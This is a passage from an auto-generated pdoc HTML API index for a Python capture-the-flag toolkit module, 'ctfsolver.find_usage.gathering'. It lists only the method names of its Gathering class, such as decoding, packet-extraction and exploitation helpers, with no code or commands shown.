<li><code><a title="ctfsolver.find_usage.gathering.Gathering.exploitation" href="#ctfsolver.find_usage.gathering.Gathering.exploitation">exploitation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_exif" href="#ctfsolver.find_usage.gathering.Gathering.extract_exif">extract_exif</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_files_from_binary" href="#ctfsolver.find_usage.gathering.Gathering.extract_files_from_binary">extract_files_from_binary</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_file" href="#ctfsolver.find_usage.gathering.Gathering.extract_macros_from_file">extract_macros_from_file</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods" href="#ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods">extract_macros_from_ods</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods_initial" href="#ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods_initial">extract_macros_from_ods_initial</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_macros_with_odfpy" href="#ctfsolver.find_usage.gathering.Gathering.extract_macros_with_odfpy">extract_macros_with_odfpy</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_printable_with_spaces" href="#ctfsolver.find_usage.gathering.Gathering.extract_printable_with_spaces">extract_printable_with_spaces</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.extract_skew1_bootkey_piece" href="#ctfsolver.find_usage.gathering.Gathering.extract_skew1_bootkey_piece">extract_skew1_bootkey_piece</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.find_collision" href="#ctfsolver.find_usage.gathering.Gathering.find_collision">find_collision</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.find_invpow" href="#ctfsolver.find_usage.gathering.Gathering.find_invpow">find_invpow</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.find_offset" href="#ctfsolver.find_usage.gathering.Gathering.find_offset">find_offset</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.finding_next_prime" href="#ctfsolver.find_usage.gathering.Gathering.finding_next_prime">finding_next_prime</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.from_hex" href="#ctfsolver.find_usage.gathering.Gathering.from_hex">from_hex</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.gathering" href="#ctfsolver.find_usage.gathering.Gathering.gathering">gathering</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generate_cipher" href="#ctfsolver.find_usage.gathering.Gathering.generate_cipher">generate_cipher</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generate_pattern" href="#ctfsolver.find_usage.gathering.Gathering.generate_pattern">generate_pattern</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generate_payload" href="#ctfsolver.find_usage.gathering.Gathering.generate_payload">generate_payload</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generate_url" href="#ctfsolver.find_usage.gathering.Gathering.generate_url">generate_url</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generating" href="#ctfsolver.find_usage.gathering.Gathering.generating">generating</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.generator" href="#ctfsolver.find_usage.gathering.Gathering.generator">generator</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_address" href="#ctfsolver.find_usage.gathering.Gathering.get_address">get_address</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_attributes" href="#ctfsolver.find_usage.gathering.Gathering.get_attributes">get_attributes</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_cell_size" href="#ctfsolver.find_usage.gathering.Gathering.get_cell_size">get_cell_size</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_elf_function_address" href="#ctfsolver.find_usage.gathering.Gathering.get_elf_function_address">get_elf_function_address</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_flag_length" href="#ctfsolver.find_usage.gathering.Gathering.get_flag_length">get_flag_length</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_functions" href="#ctfsolver.find_usage.gathering.Gathering.get_functions">get_functions</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_instruments" href="#ctfsolver.find_usage.gathering.Gathering.get_instruments">get_instruments</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_message" href="#ctfsolver.find_usage.gathering.Gathering.get_message">get_message</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_online_passwords" href="#ctfsolver.find_usage.gathering.Gathering.get_online_passwords">get_online_passwords</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_output_variables" href="#ctfsolver.find_usage.gathering.Gathering.get_output_variables">get_output_variables</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_registers" href="#ctfsolver.find_usage.gathering.Gathering.get_registers">get_registers</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_request" href="#ctfsolver.find_usage.gathering.Gathering.get_request">get_request</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_scapy_tcp_stream" href="#ctfsolver.find_usage.gathering.Gathering.get_scapy_tcp_stream">get_scapy_tcp_stream</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_tcp_stream" href="#ctfsolver.find_usage.gathering.Gathering.get_tcp_stream">get_tcp_stream</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.get_welcome_message" href="#ctfsolver.find_usage.gathering.Gathering.get_welcome_message">get_welcome_message</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.getting_base64" href="#ctfsolver.find_usage.gathering.Gathering.getting_base64">getting_base64</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.getting_round" href="#ctfsolver.find_usage.gathering.Gathering.getting_round">getting_round</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.hash_pw" href="#ctfsolver.find_usage.gathering.Gathering.hash_pw">hash_pw</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.hex_to_bytes_le" href="#ctfsolver.find_usage.gathering.Gathering.hex_to_bytes_le">hex_to_bytes_le</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.hex_to_string" href="#ctfsolver.find_usage.gathering.Gathering.hex_to_string">hex_to_string</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.hexdump_to_binary" href="#ctfsolver.find_usage.gathering.Gathering.hexdump_to_binary">hexdump_to_binary</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.hive_solution" href="#ctfsolver.find_usage.gathering.Gathering.hive_solution">hive_solution</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.init_some_values" href="#ctfsolver.find_usage.gathering.Gathering.init_some_values">init_some_values</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.initialize_values" href="#ctfsolver.find_usage.gathering.Gathering.initialize_values">initialize_values</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.int_array_to_bytes" href="#ctfsolver.find_usage.gathering.Gathering.int_array_to_bytes">int_array_to_bytes</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.interacting_with_binary" href="#ctfsolver.find_usage.gathering.Gathering.interacting_with_binary">interacting_with_binary</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.interacting_with_mcp" href="#ctfsolver.find_usage.gathering.Gathering.interacting_with_mcp">interacting_with_mcp</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.interactive" href="#ctfsolver.find_usage.gathering.Gathering.interactive">interactive</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.is_prime" href="#ctfsolver.find_usage.gathering.Gathering.is_prime">is_prime</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.juilius_decrypt" href="#ctfsolver.find_usage.gathering.Gathering.juilius_decrypt">juilius_decrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.known_colissions" href="#ctfsolver.find_usage.gathering.Gathering.known_colissions">known_colissions</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.length_find" href="#ctfsolver.find_usage.gathering.Gathering.length_find">length_find</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.list_all_files" href="#ctfsolver.find_usage.gathering.Gathering.list_all_files">list_all_files</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.load_compressed_data" href="#ctfsolver.find_usage.gathering.Gathering.load_compressed_data">load_compressed_data</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.load_lyrics" href="#ctfsolver.find_usage.gathering.Gathering.load_lyrics">load_lyrics</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.load_master_key" href="#ctfsolver.find_usage.gathering.Gathering.load_master_key">load_master_key</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.load_shellcode" href="#ctfsolver.find_usage.gathering.Gathering.load_shellcode">load_shellcode</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.local_evtx_analysis" href="#ctfsolver.find_usage.gathering.Gathering.local_evtx_analysis">local_evtx_analysis</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.local_exploitation" href="#ctfsolver.find_usage.gathering.Gathering.local_exploitation">local_exploitation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.local_preparations" href="#ctfsolver.find_usage.gathering.Gathering.local_preparations">local_preparations</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.local_run" href="#ctfsolver.find_usage.gathering.Gathering.local_run">local_run</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.local_searching_file" href="#ctfsolver.find_usage.gathering.Gathering.local_searching_file">local_searching_file</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.look_all_subkeys" href="#ctfsolver.find_usage.gathering.Gathering.look_all_subkeys">look_all_subkeys</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.looper" href="#ctfsolver.find_usage.gathering.Gathering.looper">looper</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.lyric_transformation" href="#ctfsolver.find_usage.gathering.Gathering.lyric_transformation">lyric_transformation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.lyric_transpose" href="#ctfsolver.find_usage.gathering.Gathering.lyric_transpose">lyric_transpose</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.lyrics_all" href="#ctfsolver.find_usage.gathering.Gathering.lyrics_all">lyrics_all</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.lyrics_transformation" href="#ctfsolver.find_usage.gathering.Gathering.lyrics_transformation">lyrics_transformation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.main_multi_process" href="#ctfsolver.find_usage.gathering.Gathering.main_multi_process">main_multi_process</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.md5_hash" href="#ctfsolver.find_usage.gathering.Gathering.md5_hash">md5_hash</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.menu_handler" href="#ctfsolver.find_usage.gathering.Gathering.menu_handler">menu_handler</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.modify_picture" href="#ctfsolver.find_usage.gathering.Gathering.modify_picture">modify_picture</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.music21_analysis" href="#ctfsolver.find_usage.gathering.Gathering.music21_analysis">music21_analysis</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.music21_note_analysis" href="#ctfsolver.find_usage.gathering.Gathering.music21_note_analysis">music21_note_analysis</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.mutate_key" href="#ctfsolver.find_usage.gathering.Gathering.mutate_key">mutate_key</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.nrzi_formater" href="#ctfsolver.find_usage.gathering.Gathering.nrzi_formater">nrzi_formater</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.nrzi_formater_for_rest" href="#ctfsolver.find_usage.gathering.Gathering.nrzi_formater_for_rest">nrzi_formater_for_rest</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.nrzi_to_ascii" href="#ctfsolver.find_usage.gathering.Gathering.nrzi_to_ascii">nrzi_to_ascii</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.open_file" href="#ctfsolver.find_usage.gathering.Gathering.open_file">open_file</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.oracle_encrypt" href="#ctfsolver.find_usage.gathering.Gathering.oracle_encrypt">oracle_encrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.parse_csr" href="#ctfsolver.find_usage.gathering.Gathering.parse_csr">parse_csr</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.payload_maker" href="#ctfsolver.find_usage.gathering.Gathering.payload_maker">payload_maker</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.pickle_load_data" href="#ctfsolver.find_usage.gathering.Gathering.pickle_load_data">pickle_load_data</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.pickle_save_data" href="#ctfsolver.find_usage.gathering.Gathering.pickle_save_data">pickle_save_data</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.play_game" href="#ctfsolver.find_usage.gathering.Gathering.play_game">play_game</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.play_round" href="#ctfsolver.find_usage.gathering.Gathering.play_round">play_round</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.plc_initiate_connection" href="#ctfsolver.find_usage.gathering.Gathering.plc_initiate_connection">plc_initiate_connection</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.plc_work" href="#ctfsolver.find_usage.gathering.Gathering.plc_work">plc_work</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.pollute" href="#ctfsolver.find_usage.gathering.Gathering.pollute">pollute</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.position_cipher" href="#ctfsolver.find_usage.gathering.Gathering.position_cipher">position_cipher</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.preparing_dictionary" href="#ctfsolver.find_usage.gathering.Gathering.preparing_dictionary">preparing_dictionary</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.print_dictionary" href="#ctfsolver.find_usage.gathering.Gathering.print_dictionary">print_dictionary</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.print_to_File" href="#ctfsolver.find_usage.gathering.Gathering.print_to_File">print_to_File</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.pyshark_extrac_tcp_stream_numbers" href="#ctfsolver.find_usage.gathering.Gathering.pyshark_extrac_tcp_stream_numbers">pyshark_extrac_tcp_stream_numbers</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.pyshark_extract_tcp_streams" href="#ctfsolver.find_usage.gathering.Gathering.pyshark_extract_tcp_streams">pyshark_extract_tcp_streams</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.random_flouri_generator" href="#ctfsolver.find_usage.gathering.Gathering.random_flouri_generator">random_flouri_generator</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.read_address_positions" href="#ctfsolver.find_usage.gathering.Gathering.read_address_positions">read_address_positions</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.read_json" href="#ctfsolver.find_usage.gathering.Gathering.read_json">read_json</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.reassemblying_dns" href="#ctfsolver.find_usage.gathering.Gathering.reassemblying_dns">reassemblying_dns</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.reconstructing_url" href="#ctfsolver.find_usage.gathering.Gathering.reconstructing_url">reconstructing_url</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.recover_skew1_cell_hex" href="#ctfsolver.find_usage.gathering.Gathering.recover_skew1_cell_hex">recover_skew1_cell_hex</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.regexp" href="#ctfsolver.find_usage.gathering.Gathering.regexp">regexp</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.remote_exploitation" href="#ctfsolver.find_usage.gathering.Gathering.remote_exploitation">remote_exploitation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.rot" href="#ctfsolver.find_usage.gathering.Gathering.rot">rot</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.rot_bruteforce" href="#ctfsolver.find_usage.gathering.Gathering.rot_bruteforce">rot_bruteforce</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.rot_char" href="#ctfsolver.find_usage.gathering.Gathering.rot_char">rot_char</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.run" href="#ctfsolver.find_usage.gathering.Gathering.run">run</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.saving_requests" href="#ctfsolver.find_usage.gathering.Gathering.saving_requests">saving_requests</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.saving_stream_4_encrypted_bytes" href="#ctfsolver.find_usage.gathering.Gathering.saving_stream_4_encrypted_bytes">saving_stream_4_encrypted_bytes</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.saving_to_json" href="#ctfsolver.find_usage.gathering.Gathering.saving_to_json">saving_to_json</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.saving_xml" href="#ctfsolver.find_usage.gathering.Gathering.saving_xml">saving_xml</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.searching_packets" href="#ctfsolver.find_usage.gathering.Gathering.searching_packets">searching_packets</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.searching_records" href="#ctfsolver.find_usage.gathering.Gathering.searching_records">searching_records</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.send_file" href="#ctfsolver.find_usage.gathering.Gathering.send_file">send_file</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.send_to_bot" href="#ctfsolver.find_usage.gathering.Gathering.send_to_bot">send_to_bot</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.sending_request" href="#ctfsolver.find_usage.gathering.Gathering.sending_request">sending_request</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.setup" href="#ctfsolver.find_usage.gathering.Gathering.setup">setup</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.setup_request" href="#ctfsolver.find_usage.gathering.Gathering.setup_request">setup_request</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.setup_sse" href="#ctfsolver.find_usage.gathering.Gathering.setup_sse">setup_sse</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.simple_payload_send" href="#ctfsolver.find_usage.gathering.Gathering.simple_payload_send">simple_payload_send</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.simulate_ansi_typing" href="#ctfsolver.find_usage.gathering.Gathering.simulate_ansi_typing">simulate_ansi_typing</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.skew_get_value" href="#ctfsolver.find_usage.gathering.Gathering.skew_get_value">skew_get_value</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.smart_extract_packets" href="#ctfsolver.find_usage.gathering.Gathering.smart_extract_packets">smart_extract_packets</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.smarter_bruteforcer" href="#ctfsolver.find_usage.gathering.Gathering.smarter_bruteforcer">smarter_bruteforcer</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.snap_initiate_connection" href="#ctfsolver.find_usage.gathering.Gathering.snap_initiate_connection">snap_initiate_connection</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.socket_initiate_connection" href="#ctfsolver.find_usage.gathering.Gathering.socket_initiate_connection">socket_initiate_connection</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.solve" href="#ctfsolver.find_usage.gathering.Gathering.solve">solve</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.solve_challenge" href="#ctfsolver.find_usage.gathering.Gathering.solve_challenge">solve_challenge</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.solve_equations" href="#ctfsolver.find_usage.gathering.Gathering.solve_equations">solve_equations</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.sorting_results" href="#ctfsolver.find_usage.gathering.Gathering.sorting_results">sorting_results</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.ssh_connect" href="#ctfsolver.find_usage.gathering.Gathering.ssh_connect">ssh_connect</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.str_xor" href="#ctfsolver.find_usage.gathering.Gathering.str_xor">str_xor</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.stream_identifier" href="#ctfsolver.find_usage.gathering.Gathering.stream_identifier">stream_identifier</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.test_letter" href="#ctfsolver.find_usage.gathering.Gathering.test_letter">test_letter</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.testin_streams" href="#ctfsolver.find_usage.gathering.Gathering.testin_streams">testin_streams</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.testing_ansii_escape" href="#ctfsolver.find_usage.gathering.Gathering.testing_ansii_escape">testing_ansii_escape</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.textFromPDF" href="#ctfsolver.find_usage.gathering.Gathering.textFromPDF">textFromPDF</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.to_hex" href="#ctfsolver.find_usage.gathering.Gathering.to_hex">to_hex</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.tools_result" href="#ctfsolver.find_usage.gathering.Gathering.tools_result">tools_result</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.translated" href="#ctfsolver.find_usage.gathering.Gathering.translated">translated</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.try_catch" href="#ctfsolver.find_usage.gathering.Gathering.try_catch">try_catch</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.try_key" href="#ctfsolver.find_usage.gathering.Gathering.try_key">try_key</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.trying_to_exploit_ods" href="#ctfsolver.find_usage.gathering.Gathering.trying_to_exploit_ods">trying_to_exploit_ods</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.unified_extract_packets" href="#ctfsolver.find_usage.gathering.Gathering.unified_extract_packets">unified_extract_packets</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.validate_flag" href="#ctfsolver.find_usage.gathering.Gathering.validate_flag">validate_flag</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.verify_js_reconstructed" href="#ctfsolver.find_usage.gathering.Gathering.verify_js_reconstructed">verify_js_reconstructed</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.xor_bytes" href="#ctfsolver.find_usage.gathering.Gathering.xor_bytes">xor_bytes</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.xor_decrypt" href="#ctfsolver.find_usage.gathering.Gathering.xor_decrypt">xor_decrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.xor_function_dec" href="#ctfsolver.find_usage.gathering.Gathering.xor_function_dec">xor_function_dec</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.11.6</a>.</p>
</footer>
</body>
</html>
